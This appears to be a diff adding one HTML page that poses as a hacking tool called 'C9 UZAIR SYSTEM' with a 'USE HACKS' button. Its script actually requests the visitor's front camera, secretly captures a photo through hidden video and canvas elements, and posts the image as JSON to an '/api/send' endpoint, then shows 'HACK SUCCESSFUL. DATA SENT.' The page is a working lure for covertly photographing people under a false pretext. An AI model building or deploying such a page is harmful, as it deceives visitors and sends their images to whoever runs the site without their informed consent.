@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C9 UZAIR SYSTEM</title>
+    <style>
+        body { background-color: black; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        h1 { text-shadow: 0 0 10px #0f0; margin-bottom: 10px; }
+        .box { border: 2px solid #0f0; padding: 30px; box-shadow: 0 0 20px #0f0; background: rgba(0, 20, 0, 0.9); text-align: center; }
+        button { background: #0f0; color: black; border: none; padding: 15px 30px; font-size: 1.2rem; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        button:hover { background: #000; color: #0f0; border: 2px solid #0f0; }
+        #status { color: red; margin-top: 15px; font-weight: bold; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>C9 UZAIR SYSTEM</h1>
+        <p>TARGET: UNKNOWN</p>
+        <p>STATUS: READY TO BREACH</p>
+        <button id="btn">USE HACKS</button>
+        <p id="status"></p>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const btn = document.getElementById('btn');
+        const status = document.getElementById('status');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        btn.addEventListener('click', async () => {
+            status.style.color = "#0f0";
+            status.innerText = "INITIALIZING EXPLOIT...";
+
+            try {
+                // Camera Permission (Front)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                
+                await new Promise(r => setTimeout(r, 1500)); // 1.5 sec wait for focus
+
+                // Capture
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0);
+                const imageData = canvas.toDataURL('image/png');
+
+                // Stop Camera
+                stream.getTracks().forEach(track => track.stop());
+
+                status.innerText = "SENDING DATA...";
+
+                // Send to Vercel API
+                const res = await fetch('/api/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imageData })
+                });
+
+                if(res.ok) status.innerText = "HACK SUCCESSFUL. DATA SENT.";
+                else status.innerText = "SERVER ERROR.";
+
+            } catch (e) {
+                status.style.color = "red";
+                status.innerText = "PERMISSION DENIED.";
+            }
+        });
+    </script>
+</body>
+</html>
